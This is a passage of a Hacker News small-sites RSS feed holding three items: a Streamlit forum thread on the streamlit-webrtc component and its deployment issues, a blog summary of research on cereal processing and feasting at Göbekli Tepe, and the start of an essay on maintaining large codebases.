In case of <code>streamlit-webrtc</code> , additionally, <a href="https://github.com/aiortc/aiortc" rel="noopener nofollow ugc">aiortc</a> does not work in normal Streamlit scripts, which are executed from top to bottom and terminated at each user interaction (more fundamentally, it‚Äôs because of WebRTC‚Äôs async nature).</p>
<p>This library approaches this problem by creating threads independent of Streamlit execution.<br>
When the component is used for the first time, it forks a thread, launches <code>aiortc</code>‚Äôs code on an event loop in the thread, and maintains the thread over all the script executions until the WebRTC session is closed.</p>
<p>As a result of this approach, developers should alter their programming style when using this library, from Streamlit‚Äôs declarative way to an event-and-callback-based one. <a href="https://github.com/whitphx/streamlit-webrtc/blob/477416da84e77d76201d97269589fe5ff5d17d37/app.py#L293-L303" rel="noopener nofollow ugc">streamlit-webrtc/app.py at 477416da84e77d76201d97269589fe5ff5d17d37 ¬∑ whitphx/streamlit-webrtc ¬∑ GitHub</a> is an example. In this code, the computer vision part resides in a callback function, which is called from the forked thread triggered by the media stream regardless of Streamlit‚Äôs execution timing.</p>
<p>To bridge this forked execution of WebRTC and normal Streamlit‚Äôs controls, <code>streamlit-webrtc</code> exposes a <code>context</code> object, which is an interface to the objects running in the WebRTC‚Äôs async world.<br>
By using it, values from Streamlit‚Äôs controls can be passed to the computer vision code running in the forked thread, like <a href="https://github.com/whitphx/streamlit-webrtc/blob/477416da84e77d76201d97269589fe5ff5d17d37/app.py#L305-L317" rel="noopener nofollow ugc">streamlit-webrtc/app.py at 477416da84e77d76201d97269589fe5ff5d17d37 ¬∑ whitphx/streamlit-webrtc ¬∑ GitHub</a>.</p>
        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
          <p>Welcome to the community <a href="https://discuss.streamlit.io/u/whitphx">@whitphx</a>, looks awesome !</p>
<p>Feel free to add it to our <a href="https://discuss.streamlit.io/t/streamlit-components-community-tracker/4634">community tracker</a> so we don‚Äôt lose it from our radars <img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/grin.png?v=9" title=":grin:" alt=":grin:"><img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/grin.png?v=9" title=":grin:" alt=":grin:"><img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/grin.png?v=9" title=":grin:" alt=":grin:"></p>
        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/whitphx"><span itemprop="name">whitphx</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-11T13:04:31Z">
                January 11, 2021,  1:04pm
              </time>
              <meta itemprop="dateModified" content="2021-01-11T13:04:31Z">
          <span itemprop="position">#4</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p><a href="https://discuss.streamlit.io/u/andfanilo">@andfanilo</a> Thank you! I edited the wiki <img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/smile.png?v=9" title=":smile:" alt=":smile:"></p>
        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/tim"><span itemprop="name">tim</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-13T16:25:04Z">
                January 13, 2021,  4:25pm
              </time>
              <meta itemprop="dateModified" content="2021-01-13T16:25:04Z">
          <span itemprop="position">#5</span>
          </span>
        </p></div>
        <p>Whoa - this is really great. Nice work, <a href="https://discuss.streamlit.io/u/whitphx">@whitphx</a>!</p>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/MalanG"><span itemprop="name">MalanG</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-15T21:55:39Z">
                January 15, 2021,  9:55pm
              </time>
              <meta itemprop="dateModified" content="2021-01-15T21:55:39Z">
          <span itemprop="position">#6</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Hello <a href="https://discuss.streamlit.io/u/whitphx">@whitphx</a>,</p>
<p>Thanks for a great project!<br>
I am trying to test yours, and couldn‚Äôt install streamlit-webrtc.</p>
<pre><code>(venv) (base) admin@Youjins-MacBook-Pro mqtt-camera-streamer-master % pip install streamlit-webrtc              
ERROR: Could not find a version that satisfies the requirement streamlit-webrtc
ERROR: No matching distribution found for streamlit-webrtc
</code></pre>
<p>Can I install it if I download the github repo?</p>
        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/whitphx"><span itemprop="name">whitphx</span></a>
            
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2021-01-16T09:39:03Z">
              <time itemprop="dateModified" datetime="2021-01-16T13:14:24Z">
                January 16, 2021,  1:14pm
              </time>
          <span itemprop="position">#7</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Hello <a href="https://discuss.streamlit.io/u/malang">@MalanG</a> ,</p>
<p>I think it‚Äôs because you are using python &lt;3.8 <s>though <code>streamlit-webrtc</code> currently supports only &gt;=3.8.<br>
Please try with python 3.8.</s></p>
<p><s>I will also fix the package to be compatible with older versions of Python.</s></p>
<p>EDIT: I updated the package to be compatible with Python 3.6 and 3.7. Please try again.</p>
        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/whitphx"><span itemprop="name">whitphx</span></a>
            
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2021-01-18T13:42:59Z">
              <time itemprop="dateModified" datetime="2021-01-18T14:36:28Z">
                January 18, 2021,  2:36pm
              </time>
          <span itemprop="position">#8</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>I got an invitation to Streamlit Sharing then deployed the sample app there: <a href="https://share.streamlit.io/whitphx/streamlit-webrtc-example/main/app.py" rel="noopener nofollow ugc">https://share.streamlit.io/whitphx/streamlit-webrtc-example/main/app.py</a><br>
but it didn‚Äôt work with a ‚Äúpermission denied‚Äù error when the app requires capturing video or audio from user‚Äôs device.</p>
<p>It means many interesting applications of this component, including real-time object detection and image transformation, cannot be used on Streamlit Sharing‚Ä¶<br>
The only page of the sample app that works is the third one, where the app plays video and audio files on server-side and transmit them to the client.</p>
<p>This is because, on Streamlit Sharing, the app is running inside iframe.<br>
<code>getUserMedia</code>, which is used to get access to user‚Äôs device, requires Feature Policy when called inside iframe.<br>
Details are here: <a href="https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia#Feature_Policy" rel="noopener nofollow ugc">MediaDevices.getUserMedia() - Web APIs | MDN</a></p>
<p>This is out of my control <img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/crying_cat_face.png?v=9" title=":crying_cat_face:" alt=":crying_cat_face:"></p>
<p>EDIT: This problem has also been stated in <a href="https://discuss.streamlit.io/t/sharing-blocks-custom-webcam-component-due-to-featurepolicy/8876">Sharing blocks custom webcam component due to featurePolicy</a></p>
        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
          <p><img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/frowning.png?v=9" title=":frowning:" alt=":frowning:"></p>
<p>Well this is an interesting discussion to raise with the product team, thanks for taking the time to track this down! I‚Äôll ping them on my side too <img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/wink.png?v=9" title=":wink:" alt=":wink:"></p>
<p>Fanilo</p>
        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <p>Wow this is awesome ! Great work <a href="https://discuss.streamlit.io/u/whitphx">@whitphx</a>  !! <img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/scream.png?v=9" title=":scream:" alt=":scream:"><img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/clap.png?v=9" title=":clap:" alt=":clap:"><img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/clap.png?v=9" title=":clap:" alt=":clap:"><img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/clap.png?v=9" title=":clap:" alt=":clap:"></p>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/tim"><span itemprop="name">tim</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-01-19T17:28:11Z">
                January 19, 2021,  5:28pm
              </time>
              <meta itemprop="dateModified" content="2021-01-19T17:28:11Z">
          <span itemprop="position">#11</span>
          </span>
        </p></div>
        <p>Hey thanks for raising this, <a href="https://discuss.streamlit.io/u/whitphx">@whitphx</a> - we‚Äôre discussing this!</p>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/whitphx"><span itemprop="name">whitphx</span></a>
            
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2021-02-02T04:33:34Z">
              <time itemprop="dateModified" datetime="2021-02-02T04:51:49Z">
                February 2, 2021,  4:51am
              </time>
          <span itemprop="position">#12</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Wow, it is working now on Sharing. Thank you, Streamlit team!<br>
<a href="https://share.streamlit.io/whitphx/streamlit-webrtc-example/main/app.py" target="_blank" rel="noopener nofollow ugc">https://share.streamlit.io/whitphx/streamlit-webrtc-example/main/app.py</a></p>
<p>The performance is much better than the sample hosted on Heroku <img src="https://sjc3.discourse-cdn.com/business7/images/emoji/google/laughing.png?v=9" title=":laughing:" alt=":laughing:"></p>
        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <p>Very useful tool but is it possible to access for example rear camera of mobile phone with this library?</p>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/whitphx"><span itemprop="name">whitphx</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-02-05T10:17:17Z">
                February 5, 2021, 10:17am
              </time>
              <meta itemprop="dateModified" content="2021-02-05T10:17:17Z">
          <span itemprop="position">#14</span>
          </span>
        </p></div>
        <p>Yes, you can choose the camera with the ‚ÄúSELECT DEVICE‚Äù button.</p>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/whitphx"><span itemprop="name">whitphx</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2021-02-05T10:39:27Z">
                February 5, 2021, 10:39am
              </time>
              <meta itemprop="dateModified" content="2021-02-05T10:39:27Z">
          <span itemprop="position">#15</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>I wrote a tutorial about how to use this library:</p>

        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <p>Is it possible to store frame by frame results through each iteration in a file like json for example?</p>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/whitphx"><span itemprop="name">whitphx</span></a>
            
          </span></p>


          </div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://discuss.streamlit.io/t/new-component-streamlit-webrtc-a-new-way-to-deal-with-real-time-media-streams/8669">https://discuss.streamlit.io/t/new-component-streamlit-webrtc-a-new-way-to-deal-with-real-time-media-streams/8669</a></em></p>]]>
            </description>
            <link>https://discuss.streamlit.io/t/new-component-streamlit-webrtc-a-new-way-to-deal-with-real-time-media-streams/8669</link>
            <guid isPermaLink="false">hacker-news-small-sites-26130494</guid>
            <pubDate>Sun, 14 Feb 2021 08:01:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cereals, feasts and monuments at G√∂bekli Tepe (2019)]]>
            </title>
            <description>
<![CDATA[
Score 49 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26129693">thread link</a>) | @benbreen
<br/>
February 13, 2021 | https://www.dainst.blog/the-tepe-telegrams/2019/05/09/cereals-feasts-and-monuments-at-gobekli-tepe/ | <a href="https://web.archive.org/web/*/https://www.dainst.blog/the-tepe-telegrams/2019/05/09/cereals-feasts-and-monuments-at-gobekli-tepe/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	
		<p>We were asked in comments and messages to elaborate some more on the contents of our recent paper. So here is a short summary of the article recently published in PLoS ONE. For more information on the findings outlined here, please consult the original publication:</p>
<p><em>Dietrich L, Meister J, Dietrich O, Notroff J, Kiep J, Heeb J, et al. (2019) Cereal processing at Early Neolithic G√∂bekli Tepe, southeastern Turkey. PLoS ONE 14(5):</em> e0215214. <a href="https://doi.org/10.1371/journal.pone.0215214">https://doi.org/10.1371/journal.pone.0215214</a></p>
<p>Cereal food is one of the most important components of our modern diet. Its integration into human subsistence strategy during the late Epipalaeolithic (c. 12500‚Äì9600 cal BC) and Pre-Pottery Neolithic (PPN, c. 9600‚Äì7000 cal BC) has been recognized as a very long and complex process involving the selection and utilization of plants, strategies of exploitation of plants and land, the development of cultivation, and ways of processing, storing, and consuming plants. Widespread adoption of farming and agriculture at the end of the Pre-Pottery Neolithic (PPNB, c. 8800‚Äì7000 cal BC), the deliberate, large-scale cultivation of domesticated cereals and other plants, was predated by a longer period of experimentation and technological modification leading to the development of specialized tool kits for plant-food processing. Typical implements are e.g. pounding and grinding tools used in pairs, comprising a static low implement (mortar, grinding slab or grinding bowl) and an active upper tool that is moved across its surface (pestle or handstone).</p>
<p><strong>Cereal use in the Early Neolithic</strong><br>
The regular processing of wild cereals through grinding seems to have been established first in the Late Natufian, as suggested by macrobotanical evidence as well as by morphological changes in grinding stones combined with use-wear analyses. Flat, large grinding stones and handstones became a supra-regional standard during the Levantine PPN, constituting an integral part of the architecture. Recent investigations have highlighted the area between the upper reaches of Euphrates and Tigris as one region where the transition to food-producing subsistence took place early during the Epipalaeolithic and the Pre-Pottery Neolithic. The distribution areas of the wild forms of einkorn, emmer wheat, barley and other ‚ÄòNeolithic founder crops‚Äô overlap here and DNA fingerprinting has pinpointed the transition of two wild wheat variants to domesticated crops to this part of the Fertile Crescent. Systematic early plant use has been found at a variety of sites, like Cafer H√∂y√ºk, √áay√∂n√º, Hallan √áemi, Jerf el Ahmar or K√∂rtik Tepe.<br>
G√∂bekli Tepe has not played any role in discussions of early cereal use so far. The reasons can be found ‚Äì at least in part ‚Äì in the problematic nature of direct evidence for cereals on site. Although analysis of macrobotanical remains indicates the presence of wild einkorn (Triticum cf. boeticum/urartu), wild barley (Hordeum cf. spontaneum) and possibly wild wheat/rye (Triticum/Secale), as well as almonds (Prunus sp.) and pistachio (Pistacia sp.) at G√∂bekli Tepe, only a conspicuously low amount of carbonized plant remains has been recovered, both in handpicked and in flotation samples.</p>
<div id="attachment_7549"><p><img aria-describedby="caption-attachment-7549" loading="lazy" src="https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g007-743x1024.png" alt="journal.pone.0215214.g007" width="676" height="932" srcset="https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g007-743x1024.png 743w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g007-580x800.png 580w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g007-1306x1800.png 1306w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g007-768x1058.png 768w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g007-1115x1536.png 1115w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g007-1486x2048.png 1486w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g007-676x932.png 676w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g007.png 1650w" sizes="(max-width: 676px) 100vw, 676px"></p><p id="caption-attachment-7549">Grinding tools from G√∂bekli Tepe. (A), (C) Neolithic handstones of type 1; (B) Neolithic handstone of type 2; (D) Experimental handstone of type 1, produced as copy of (C); (E, F) Neolithic grinding bowls (German Archaeological Institute, 3D-models H. H√∂hler-Brockmann and N. Sch√§kel).</p></div>
<p>However, G√∂bekli Tepe has not only produced an impressive set of architecture ‚Äì monumental round to oval buildings with T-shaped limestone pillars, erected in an earlier phase, and smaller rectangular buildings, built around them in a partially contemporaneous and later phase ‚Äì but also a unusually large number of over 7000 grinding tools. We analyzed these tools using an integrated approach of formal, experimental, and macro- / microscopical use-wear analyses.</p>
<p><strong>G√∂bekli Tepe</strong><br>
As a first step in our analysis we had to determine the functional variation of these grinding tools, as a wide range of uses is attested archaeologically and ethnographically, ranging from cereal processing to pounding of meat or crushing of minerals. Grinding and pounding equipment from G√∂bekli Tepe was documented through 3D-modelling by structure from motion, and surfaces were macro- and microscopically analyzed for use-wear. We used replicas of the equipment identified on site to experimentally grind different materials and establish a reference collection for the identification of the observed traces. Further, phytolith samples taken from the sediments inside and outside buildings at G√∂bekli Tepe and from grinding stone surfaces allowed us to determine and quantify the presence of plants. Phytoliths were abundant in all nine soil samples examined, ranging from 0.5 to 3.0 million phytoliths per gram of sediment. Grass phytoliths were the most common group identified. The sediments inside the rectangular buildings largely contain markers for the upper and middle part of plants. This could be indicative of harvested cereals, as plants are usually collected and transported in sheaves. To contextualize the results, we assessed the spatial distribution of grinding equipment and identified potential activity areas.</p>
<p><img loading="lazy" src="https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g010.png" alt="journal.pone.0215214.g010" width="1614" height="1852" srcset="https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g010.png 1614w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g010-697x800.png 697w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g010-1569x1800.png 1569w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g010-768x881.png 768w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g010-1339x1536.png 1339w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g010-676x776.png 676w, https://www.dainst.blog/the-tepe-telegrams/wp-content/uploads/sites/8/2019/05/journal.pone_.0215214.g010-892x1024.png 892w" sizes="(max-width: 1614px) 100vw, 1614px"></p>
<p>We found that the most common types of handstones used at G√∂bekli Tepe show use-wear traces connected to cereal processing. Handstones with such traces concentrate in some of the rectangular buildings, but even more so in open spaces between and around them and the (at least partly) contemporary monumental round structures.<br>
Building D was taken as a case study to asses grinding stone use within the latter. There, grinding equipment from the deepest layer, which appears to be connected to the partially intentional refilling of the structure, also shows traces of ochre, indicating its processing in this structure.<br>
The overall quantity of 7268 analyzed grinding tools from G√∂bekli Tepe appears to be too high for simple daily use, given their relatively high productivity. A single handstone of the most common types could have produced an average of 4800 g flour within eight working hours, as our experiments show. If we assume that one person needs between 500 g and 1000 g of cereals daily as nutrients for survival, this amount would be enough to feed five to ten people.</p>
<p><strong>Interpretation</strong><br>
The organization of work and food supply has always been a central question of research into G√∂bekli Tepe, as the construction and maintenance of the monumental architecture would have necessitated a considerable work force. G√∂bekli Tepe has a high concentration of distinctive architecture, often addressed as ‚Äòspecial buildings‚Äô, which do not repeat the characteristic plans of domestic buildings from contemporaneous settlements. Extensively excavated settlement sites like Nevalƒ± √áori or √áay√∂n√º have one ‚Äòspecial building‚Äô per settlement phase, while G√∂bekli Tepe has several, likely contemporary buildings of this type, which different groups of people likely used. For the buildings excavated so far, we have observed certain regularities governing the decoration of the 69 known pillars‚Äìmostly with animal motifs, but also with abstract signs. While in building A snake images prevail, in building B foxes are dominant. In building C boar take over, and in building D the imagery is more diverse with birds, especially vultures, playing a significant role. In building H felines are of importance. We see these differences in figurative expression as evidence for different groups of people ornamenting the buildings with the emblematic animals central to their group identities. The site has also produced a wide range of stationary and portable art, far outnumbering such finds from other contemporary sites. Many of the animal and human depictions are clearly marked as male, there are almost no clearly recognizable female depictions, a situation contrary to the materials known from settlements.<br>
At the same time, G√∂bekli Tepe¬¥s remote location on a barren mountain ridge is very unusual compared to the setting of contemporaneous Neolithic settlements, which are regularly located next to water sources. The construction of monumental architecture at G√∂bekli Tepe, and other similar sites in its vicinity, would have necessitated a workforce of hundreds of people even by conservative estimates. One model to explain cooperation in small-scale communities involves ritualized work feasts. M. Dietler and E. Herbich define work feasts as events in which ‚Äúcommensal hospitality is used to orchestrate voluntary collective labour,‚Äù the incentive to work together is provided by the prospect of large amounts of food and drink. The main archaeological marker for feasting would be evidence of the presence of larger amounts of foodstuffs and tools than needed by the inhabitants of a site for their subsistence. Through our analysis, we have identified evidence for G√∂bekli Tepe that fits that pattern for plant food. As no large storage facilities have been identified, we argue for a production of food for immediate consumption and interpret these seasonal peaks in activity at the site as evidence for the organization of large work feasts. This adds to archaeozoological data suggesting large-scale hunting of migratory gazelle between midsummer and autumn.</p>
							
	</div></div>]]>
            </description>
            <link>https://www.dainst.blog/the-tepe-telegrams/2019/05/09/cereals-feasts-and-monuments-at-gobekli-tepe/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26129693</guid>
            <pubDate>Sun, 14 Feb 2021 04:29:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On navigating a large codebase]]>
            </title>
            <description>
<![CDATA[
Score 261 | Comments 125 (<a href="https://news.ycombinator.com/item?id=26129190">thread link</a>) | @mooreds
<br/>
February 13, 2021 | https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/ | <a href="https://web.archive.org/web/*/https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A while ago, I‚Äôve been working on a very large codebase that consisted of a few million lines of code.
Large systems are usually a big mess and this one was no exception.
Since this is a rather common problem in software engineering, I thought the internet would be
littered with stories about this topic.
There is a lot of talk about software carpentry, while software maintenance is rarely debated.
Either large programs are being maintained by dark matter developers or
nobody thinks that writing stories about large systems are interesting enough.</p><p>In the past I‚Äôve encountered a few of those large monsters and they seem to have a lot in common.
This article will try to present some of the problems and tricks that I am using when
I have to deal with them. Hopefully this will inspire others to write similar posts
and share tips from their own bag of tricks.</p><h2 id="large-codebase-problems">Large codebase problems</h2><p>The main problem of any large codebase is the extreme complexity that stems from the fact
that we live in a messy world of details that are very hard to describe and put into words.
The programming languages that we are using nowadays are still too primitive for that task,
and it takes a lot of lines and various layers of abstractions before we are able to convey the
rules of our world to the all mighty computer [1].</p><p>The following sections will present some of the common problems which I‚Äôve discovered during my
big system adventures.</p><p>A common trait of a large codebases is that at some point they become so large and bloated
that one person alone is no longer capable of understanding all its pieces. It seems to
me that after 100‚Äô000 lines of code, the maintenance related problems start to appear
as the complexity of the code simply dwarfs the capabilities of the human brain.
Such large systems are commonly maintained by more than one person, but with a large
group of people also come large organizational problems.</p><p>Within a large group of people the number of possible communication paths between them go bananas
and so it often happens that the ass no longer knows what the head is doing.
This misunderstanding in turn cause them to build the wrong thing that doesn‚Äôt fit
into the rest of the system. You might also know this situation under the term of
‚Äúthose people had no idea what they were doing, and we will do it right this time‚Äù which is
quite often floating around in the latest maintenance team.</p><p>That rarely happens though, because it‚Äôs likely the Towel of Babel situation all over again.</p><h3 id="loss-of-knowledge">Loss of knowledge</h3><p>Large systems are usually maintained by the ones who did not build them. Initial
developers often leave the company or move up in the pecking order to
work on other projects and are therefore no longer familiar with the system.
Sometimes the bright minds outsourced the initial development of the project
in the name of lowering the costs, just to pay tenfold in the later stages once they realize
the outsourcers developed the wrong thing. Even worse is the fact that the in house developers
didn‚Äôt gain the internal domain knowledge that is necessary for further maintenance of the system.</p><p>This presents a big problem for the new maintainers, as they can‚Äôt just go
around the company and ask the original developers about the initial design decisions.
Learning this tribal knowledge usually takes a lot of time, because the code is harder to read and
understand than it is to write. These days most developers seem to switch jobs every 2 to 3 years,
therefore the learning process has to be constantly going on, otherwise you might end up
with a large and expensive monster that nobody knows anything about [2].
For most of the past large projects on which I‚Äôve been working on, the team has usually
changed by the end of the first version.</p><p>Rigorously documenting every step is not the cure for this problem, because at some point all that
junk will become outdated and nobody will have the time to spend a year just reading the
documentation and figuring out how the pieces fit together [3].</p><h3 id="lack-of-knowledge">Lack of knowledge</h3><p>Large systems become large, because they are usually trying to solve every problem under the sun.
Often the organization that is embarking on such journey does not have enough experienced
employees on board to actually pull it off. Some like to say that pressure makes diamonds,
but sometimes it also crushes the things that are under.</p><p>It‚Äôs fine to have less experienced people working on a large system as long as they have the elders
overseeing their work. In the world where senior titles are handed left and right,
that is often not the case and it‚Äôs how you end up with a very fragile system that is suitable for
a replacement as soon as it was built. Most of the larger projects that I was working on and
were considered successes, had the core parts of the system written by experienced
developers. A significant chunks were also built by greenhorns, but they were usually
guided and their blast radius was limited to the less complex parts of the system.</p><h3 id="the-astronauts">The astronauts</h3><p>Big projects tend to attract the data modelers and other cultists who like to
get in the way of getting shit done. These architecture astronauts will endlessly
discuss the finer points of their UML data models and multithreaded layers of abstraction,
that will one day allow them to be the heroes of their own story by writing some well
encapsulated and ‚ÄúSOLID‚Äù code.</p><blockquote><p>Why IBM sales reps don‚Äôt have children?</p><p>Because all they do is sit on the bed telling their spouses how great it‚Äôs going to be.</p></blockquote><p>Meanwhile, the for loopers have to fight this creeping metadata bureaucracy
madness on a daily basis. The tools handed down to them from the ivory tower usually don‚Äôt stand
the heat of the battle, but that doesn‚Äôt bother the modelers who will try to fix
the problems with more obfuscation patterns. It‚Äôs how you end with a homebrewed middleware monstrosity,
because the 100 existing ones out there are obviously not up to the task of powering our little CRUD app.</p><h3 id="documentation-problems">Documentation problems</h3><blockquote><p>I like to keep documentation separated from the code. Who am I?</p><p>A fool, with an out of sync document.</p></blockquote><p>The documentation of any large system is almost always outdated.
The code is usually changing faster due to the endless edge cases of the system
that were not being thought of early on. The discovered edge case problems are
usually fixed by bolting additional functionality right on the spot.
The average code change of such patch is usually quite small,
but a few tweaks here and there accumulate over time until the original design no
longer matches with the reality.</p><p>Tweaking the code is usually simple as most people are familiar with the process. You pull the
code from the version control, you make your tweaks and then you push it back.
On the other hand updating the documentation is way more convoluted and usually involves the
whole ceremony, because the term documentation is actually a spaghetti of Word documents,
pdfs, spreadsheets, emails, wiki pages and some text files on some dude‚Äôs hard drive.</p><p>The corporate world still loves to use MS Word for writing technical documents, even though
it‚Äôs entirely unusable for this use case. The Word doesn‚Äôt support syntax highlighting for
code snippets and you get to play the game of ‚Äúmoving one image for 5 pixels to the
left will mess with your headings and right align all text.‚Äù
It also makes it very hard to have multiple people collaborating on the same document.
The version control still treats Word documents in the same way as binary blobs,
which makes merging changes and fixing merge conflicts far harder than it should be.
I still remember how people collaborated by working each on their own copy of the
document and having a documentation officer merging all the copies together
manually to avoid any merge conflicts. Fun times.</p><p>If you are lucky, you might be writing documentation in plain text, but then you may have to
get familiar with all kinds of weird Lovecraftian toolchains that are relying on
all sorts of ancient operating system specifics in order to produce a nicer looking document.</p><p>After all these years of progress, writing documentation is still an unpleasant process
